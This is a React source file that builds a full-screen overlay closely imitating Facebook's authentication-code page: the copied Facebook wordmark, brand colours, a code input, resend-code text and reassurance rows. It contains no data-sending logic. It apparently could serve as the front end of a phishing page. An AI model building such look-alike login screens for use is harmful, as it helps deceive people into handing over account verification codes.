import React from "react";
import { styled } from "styled-components";

// ============ Page shell (Facebook Auth Platform layout) ============

const Shell = styled.div`
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  flex-direction: column;
  background: #ffffff;
  font-family: "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
  color: #050505;
  overflow-y: auto;
  overscroll-behavior-y: none;
`;

const Header = styled.div`
  position: relative;
  background: #ffffff;
  border-bottom: 1px solid #dadde1;
  height: 56px;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  padding: 0 16px;
  flex-shrink: 0;
`;

const Wordmark = styled.div`
  display: flex;
  align-items: center;
  color: #0866ff;
`;

const Body = styled.div`
  flex: 1;
  display: flex;
  justify-content: center;
  padding: 24px 20px 48px;
`;

const BugFab = styled.div`
  position: fixed;
  bottom: 16px;
  right: 16px;
  width: 28px;
  height: 28px;
  display: flex;
  align-items: center;
  justify-content: center;
  pointer-events: none;
`;

// ============ Content column ============

export const AuthColumn = styled.div`
  width: 100%;
  max-width: 600px;
  margin-bottom: 24px;
`;

// ============ Typography ============

export const AuthEyebrow = styled.p`
  font-size: 13px;
  line-height: 17px;
  font-weight: 500;
  color: #65676b;
  margin: 0 0 8px;
`;

export const AuthHeading = styled.h2`
  font-size: 24px;
  line-height: 28px;
  font-weight: 600;
  color: #050505;
  margin: 0;
`;

export const AuthBody = styled.p`
  font-size: 15px;
  line-height: 19px;
  font-weight: 400;
  color: #050505;
  margin: 20px 0 0;
`;

// ============ Illustration ============

export const AuthImageWrap = styled.div`
  width: 100%;
  margin: 10px 0;

  img {
    display: block;
    width: 100%;
    height: auto;
  }
`;

// ============ Code input (floating label) ============

const FloatLabel = styled.label`
  position: absolute;
  left: 17px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 15px;
  line-height: 1;
  color: ${(p) => (p.$error ? "#d93025" : "#65676b")};
  pointer-events: none;
  transition: top 0.1s ease, font-size 0.1s ease, transform 0.1s ease;
`;

const StyledInput = styled.input`
  width: 100%;
  height: 52px;
  border: 1px solid ${(p) => (p.$error ? "#d93025" : "#ccd0d5")};
  border-radius: 6px;
  padding: 22px 16px 4px;
  font-size: 15px;
  line-height: 19px;
  font-family: inherit;
  color: #050505;
  background: #ffffff;
  outline: none;
  box-sizing: border-box;

  &:focus {
    border-color: ${(p) => (p.$error ? "#d93025" : "#0866ff")};
    box-shadow: 0 0 0 1px ${(p) => (p.$error ? "#d93025" : "#0866ff")};
  }

  &:disabled {
    background: #f0f2f5;
  }

  &:focus + ${FloatLabel},
  &:not(:placeholder-shown) + ${FloatLabel} {
    top: 7px;
    transform: none;
    font-size: 12px;
  }

  &:focus + ${FloatLabel} {
    color: ${(p) => (p.$error ? "#d93025" : "#0866ff")};
  }
`;

const InputWrap = styled.div`
  position: relative;
  width: 100%;
`;

export function AuthInput({ placeholder, $error, id = "auth-code-input", ...props }) {
  return (
    <InputWrap>
      <StyledInput id={id} placeholder=" " $error={$error} {...props} />
      <FloatLabel htmlFor={id} $error={$error}>
        {placeholder}
      </FloatLabel>
    </InputWrap>
  );
}

export const AuthError = styled.div`
  font-size: 13px;
  line-height: 16px;
  color: #d93025;
  margin-top: 8px;
`;

// ============ Helper row (resend disclaimer) ============

const HelperRow = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 8px;
  margin-top: 12px;
  margin-bottom: 20px;

  svg {
    flex-shrink: 0;
    margin-top: 2px;
  }
`;

const HelperText = styled.span`
  font-size: 15px;
  line-height: 19px;
  color: #050505;
`;

export const AuthLink = styled.button`
  background: none;
  border: none;
  padding: 0;
  font-size: inherit;
  line-height: inherit;
  font-family: inherit;
  color: #0866ff;
  font-weight: 500;
  cursor: pointer;

  &:hover {
    text-decoration: underline;
  }
`;

export function AuthHelperRow({ children }) {
  return (
    <HelperRow>
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#65676b">
        <path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z" />
      </svg>
      <HelperText>{children}</HelperText>
    </HelperRow>
  );
}

// ============ Buttons ============

export const AuthPrimaryButton = styled.button`
  width: 100%;
  height: 44px;
  border: none;
  border-radius: 22px;
  background: #0866ff;
  color: #ffffff;
  font-size: 15px;
  font-weight: 500;
  font-family: inherit;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: background-color 150ms ease-in-out;

  &:hover:not(:disabled) {
    background: #005fe6;
  }

  &:disabled {
    opacity: 0.4;
    cursor: default;
  }
`;

export const AuthSecondaryButton = styled(AuthPrimaryButton)`
  background: #f2f4f6;
  color: #050505;
  margin-top: 12px;

  &:hover:not(:disabled) {
    background: #e4e6eb;
  }

  &:disabled {
    opacity: 0.4;
  }
`;

// ============ Info list (assurance rows) ============

const InfoListWrap = styled.div`
  display: flex;
  flex-direction: column;
  gap: 16px;
  margin: 20px 0;
`;

const InfoRowWrap = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 12px;

  svg {
    flex-shrink: 0;
    width: 24px;
    height: 24px;
  }
`;

const InfoText = styled.span`
  font-size: 15px;
  line-height: 19px;
  color: #050505;
`;

export function AuthInfoList({ children }) {
  return <InfoListWrap>{children}</InfoListWrap>;
}

export function AuthInfoRow({ icon, children }) {
  return (
    <InfoRowWrap>
      {icon}
      <InfoText>{children}</InfoText>
    </InfoRowWrap>
  );
}

// ============ Shell component ============

export default function AuthShell({ children }) {
  return (
    <Shell>
      <Header>
        <Wordmark>
          <svg
            height="22"
            viewBox="100 100 900 160"
            xmlns="http://www.w3.org/2000/svg"
            aria-label="Facebook"
          >
            <path
              d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"
              fill="#0866ff"
            />
          </svg>
        </Wordmark>
      </Header>
      <Body>{children}</Body>
      <BugFab>
        <svg width="20" height="20" viewBox="0 0 20 20" fill="#65676b">
          <path d="M10 11a.75.75 0 0 1 .75.75v4.5a.75.75 0 0 1-1.5 0v-4.5A.75.75 0 0 1 10 11z" />
          <path d="M6.818.523a.75.75 0 0 0-.545.91l.363 1.454A6.515 6.515 0 0 0 3.66 6.734a12.286 12.286 0 0 1-1.434-1.016.75.75 0 1 0-.952 1.158 13.776 13.776 0 0 0 2.145 1.45 6.623 6.623 0 0 0-.002.174V10H1.75a.75.75 0 0 0 0 1.5h1.667V13c0 .222.011.441.033.658a13.78 13.78 0 0 0-2.176 1.465.75.75 0 1 0 .952 1.16 12.285 12.285 0 0 1 1.568-1.097 6.503 6.503 0 0 0 12.274-.08c.603.344 1.173.738 1.706 1.176a.75.75 0 0 0 .952-1.159 13.77 13.77 0 0 0-2.334-1.55c.017-.189.025-.38.025-.573v-1.5h1.833a.75.75 0 0 0 0-1.5h-1.833V8.414a13.769 13.769 0 0 0 2.31-1.538.75.75 0 1 0-.953-1.158c-.495.406-1.022.775-1.576 1.1a6.513 6.513 0 0 0-2.856-3.843l.386-1.543a.75.75 0 1 0-1.455-.364l-.315 1.259A6.493 6.493 0 0 0 9.917 2a6.5 6.5 0 0 0-1.887.278l-.302-1.21a.75.75 0 0 0-.91-.545zM4.917 9.029C6.49 9.655 8.205 10 10 10c1.732 0 3.39-.32 4.917-.905V13a5 5 0 0 1-10 0V9.03zm9.903-1.514c-1.48.634-3.108.985-4.82.985-1.77 0-3.453-.376-4.972-1.051a5.002 5.002 0 0 1 9.792.066z" />
        </svg>
      </BugFab>
    </Shell>
  );
}
